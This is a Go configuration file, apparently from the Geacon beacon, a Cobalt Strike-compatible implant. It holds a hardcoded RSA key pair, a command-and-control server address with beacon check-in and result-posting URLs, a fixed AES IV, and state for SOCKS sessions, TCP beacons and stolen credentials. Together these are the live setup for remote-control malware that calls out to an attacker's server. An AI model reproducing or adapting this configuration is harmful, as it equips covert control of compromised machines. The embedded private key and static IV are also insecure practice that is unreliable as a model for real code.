package config

import (
	"time"
)

var (
	RsaPublicKey = []byte(`
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCM20iSmM0mHtheU8wDAsgkw6+So+uWodPzTu6Q
z/lro+SGFw81ffcntyyzVRWlGrMLf0ud3icxY/IXbP1X7GaIigx8ODD3P4ZSI28ZkN6qs12hfMS6
qxmWdlRFpDo+gWtaHNDf82J9ZA2mvmCocBsU86XEGncj8sFVhcHsLVamuwIDAQAB
-----END PUBLIC KEY-----	
	`)
	RsaPrivateKey = []byte(`
-----BEGIN PRIVATE KEY-----
MIICcwIBADANBgkqhkiG9w0BAQEFAASCAl0wggJZAgEAAoGBAIzbSJKYzSYe2F5TzAMCyCTDr5Kj
65ah0/NO7pDP+Wuj5IYXDzV99ye3LLNVFaUaswt/S53eJzFj8hds/VfsZoiKDHw4MPc/hlIjbxmQ
3qqzXaF8xLqrGZZ2VEWkOj6Ba1oc0N/zYn1kDaa+YKhwGxTzpcQadyPywVWFwewtVqa7AgMBAAEC
fx5kSU2r9P4faH1hhKNZhpkrn82m+8MCSFv/QNv+DQ+Jrwr1IfXdHBUYkWKinAj6aqwHFcdgqeEC
7CIPM5XqOMn5Ix5bVqPxvLD+lqit0XI2aMD1FUjZkJv3JpUYvUzIr4ldsV51OJVMZQTWRedxeupl
YJmA584T/feq1sAJpGECQQC5V8SddUnXH8PsIGZ8MiiOOk95fDxnfdSas6aX8Tapji4iNMxWMOUH
YkSxqvMZxLPMAT3KbeoewKclPnSgorsZAkEAwo3za0en9+z2hHY5wxWZF3u0ACm12mJESZyQwZEC
d94Lt+c0ylKFcDzfSnjN6MfS0FVrT0vMcVdDluuJ5uc+8wJANUrDQfMjlDOSBica0MMrXhnuGCRc
yfUoWIMnd7Dn4sD7CuLbjjzo3cKntd5NoC8q85G3zqjkFIuYg+D9b+LaoQJAEUuRMh5CnlWgbJId
/Gu1GlNS4xjSI8HMlEaoz6xWbdV9cTHKjZncZufiabpng6QP55lQWtJAMGszhP0XW0F/ZQJAHq0R
j5qENbONKCBT6K17bE52tfcLg9cMQei662Ub+gH9nsUy5phOaS2eNbM99Am2+rhJe8gY5pT95QYI
OpELiA==
-----END PRIVATE KEY-----
	`)

	// C2        = "0.0.0.0:4445"
	C2                          = "192.168.178.97:80"
	plainHTTP                   = "http://"
	sslHTTP                     = "https://"
	GetUrl                      = plainHTTP + C2 + "/api/v1/status"
	PostUrl                     = plainHTTP + C2 + "/api/v1/entry?id="
	WaitTime                    = 10000 * time.Millisecond
	VerifySSLCert               = true
	TimeOut       time.Duration = 10 //seconds

	IV                 = []byte("abcdefghijklmnop")
	GlobalKey          []byte
	AesKey             []byte
	HmacKey            []byte
	Counter            = 0
	TcpBeacons         []TcpBeacon
	SocksSessions      []*SocksSession
	ShellPreLoadedFile string
	StoredCredentials  *StoredCredential
	GeaconId           = 0
	SpawnBuffer        []byte
)

const (
	DebugMode = true
)
